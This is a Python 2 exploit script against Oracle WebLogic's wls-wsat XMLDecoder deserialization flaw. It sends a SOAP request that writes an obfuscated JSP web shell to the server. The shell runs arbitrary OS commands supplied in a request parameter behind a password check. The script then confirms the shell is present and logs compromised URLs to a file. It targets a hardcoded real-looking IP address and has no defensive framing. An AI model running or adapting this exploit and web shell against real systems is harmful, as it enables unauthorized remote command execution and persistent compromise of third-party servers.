#coding:utf-8
import requests
import threading
import time
import Queue

shell_path_list = ['bea_wls_internal/9j4dqk/war/wgic4.jsp','wls-wsat/54p17w/war/wgic4.jsp']
#shell_content = '201710271'
shell_content = '''201710271
&#60;&#33;&#91;&#67;&#68;&#65;&#84;&#65;&#91;&#60;&#37;&#32;&#32;&#32;&#105;&#102;&#40;&#34;&#118;&#34;&#46;&#101;&#113;&#117;&#97;&#108;&#115;&#40;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#103;&#101;&#116;&#80;&#97;&#114;&#97;&#109;&#101;&#116;&#101;&#114;&#40;&#34;&#112;&#119;&#100;&#34;&#41;&#41;&#41;&#123;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#32;&#105;&#110;&#32;&#61;&#32;&#82;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#103;&#101;&#116;&#82;&#117;&#110;&#116;&#105;&#109;&#101;&#40;&#41;&#46;&#101;&#120;&#101;&#99;&#40;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#103;&#101;&#116;&#80;&#97;&#114;&#97;&#109;&#101;&#116;&#101;&#114;&#40;&#34;&#105;&#34;&#41;&#41;&#46;&#103;&#101;&#116;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#40;&#41;&#59;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#105;&#110;&#116;&#32;&#97;&#32;&#61;&#32;&#45;&#49;&#59;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#121;&#116;&#101;&#91;&#93;&#32;&#98;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#98;&#121;&#116;&#101;&#91;&#50;&#48;&#52;&#56;&#93;&#59;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#40;&#34;&#60;&#112;&#114;&#101;&#62;&#34;&#41;&#59;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#104;&#105;&#108;&#101;&#40;&#40;&#97;&#61;&#105;&#110;&#46;&#114;&#101;&#97;&#100;&#40;&#98;&#41;&#41;&#33;&#61;&#45;&#49;&#41;&#123;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#108;&#110;&#40;&#110;&#101;&#119;&#32;&#83;&#116;&#114;&#105;&#110;&#103;&#40;&#98;&#41;&#41;&#59;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#117;&#116;&#46;&#112;&#114;&#105;&#110;&#116;&#40;&#34;&#60;&#47;&#112;&#114;&#101;&#62;&#34;&#41;&#59;&#32;&#32;&#10;&#32;&#32;&#32;&#32;&#125;&#32;&#37;&#62;&#93;&#93;&#62;'''
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110',
           'Content-Type':'text/xml'
    }

#url = 'http://129.144.21.121:7001'

def verify(url):
    for shell_path in shell_path_list:
        try:
            #print shell_path
            data = '''
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java><java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/'''+ shell_path + '''</string><void method="println"><string>'''+ shell_content +'''</string>
                </void><void method="close"/></void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
            '''
            url1 =  url +  '/wls-wsat/CoordinatorPortType'
            #print url1
            requests.post(url1,data=data,headers=headers,timeout=0.5)
        except:
            continue
    try:
        r1 = requests.get(url + '/bea_wls_internal/wgic4.jsp' ,headers = headers,timeout=0.5)
        if '201710271' in r1.content:
            print 'Success:%s/bea_wls_internal/wgic4.jsp'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/bea_wls_internal/wgic4.jsp\n')
        r2 = requests.get(url + '/wls-wsat/wgic4.jsp' ,headers = headers,timeout=0.5)
        if '201710271' in r2.content:
            print 'Success:%s/wls-wsat/wgic4.jsp'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/wls-wsat/wgic4.jsp\n')
    except:
        pass

verify('http://221.207.246.187:80')

